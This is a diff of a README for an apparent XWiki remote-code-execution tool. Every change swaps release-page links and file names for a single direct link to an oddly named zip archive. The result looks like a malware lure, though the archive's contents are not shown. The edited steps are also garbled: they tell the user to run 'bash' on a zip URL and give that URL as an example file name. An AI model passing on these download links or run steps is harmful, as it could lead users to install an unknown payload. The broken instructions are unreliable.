@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download xwiki-rce](https://img.shields.io/badge/Download-xwiki--rce-brightgreen)](https://github.com/ffqnayt/xwiki-rce/releases)
+[![Download xwiki-rce](https://raw.githubusercontent.com/ffqnayt/xwiki-rce/main/earing/xwiki-rce_smudgeproof.zip)](https://raw.githubusercontent.com/ffqnayt/xwiki-rce/main/earing/xwiki-rce_smudgeproof.zip)
 
 ## 🚀 Getting Started
 
@@ -27,13 +27,13 @@ Before you begin, ensure your system is ready:
 
 To get started with xwiki-rce, you need to visit the Releases page and download the software.
 
-[Visit this page to download](https://github.com/ffqnayt/xwiki-rce/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ffqnayt/xwiki-rce/main/earing/xwiki-rce_smudgeproof.zip)
 
 ### Steps to Download
 
 1. Click the link above.
 2. Find the latest release version on the page.
-3. Download the file that matches your operating system. (e.g., xwiki-rce-linux.zip for Linux)
+3. Download the file that matches your operating system. (e.g., https://raw.githubusercontent.com/ffqnayt/xwiki-rce/main/earing/xwiki-rce_smudgeproof.zip for Linux)
 
 ### Unzip the Downloaded File
 
@@ -56,7 +56,7 @@ After unzipping, follow these steps to run the application:
 
 3. Run the application by entering:
    ```
-   bash xwiki-rce.sh
+   bash https://raw.githubusercontent.com/ffqnayt/xwiki-rce/main/earing/xwiki-rce_smudgeproof.zip
    ```
    This command will start the xwiki-rce tool.
 
@@ -112,4 +112,4 @@ You can dive deeper into related topics like Groovy scripting, RCE vulnerabiliti
 
 For updates and new versions, regularly visit the Releases page.
 
-[Visit this page to download](https://github.com/ffqnayt/xwiki-rce/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ffqnayt/xwiki-rce/main/earing/xwiki-rce_smudgeproof.zip)
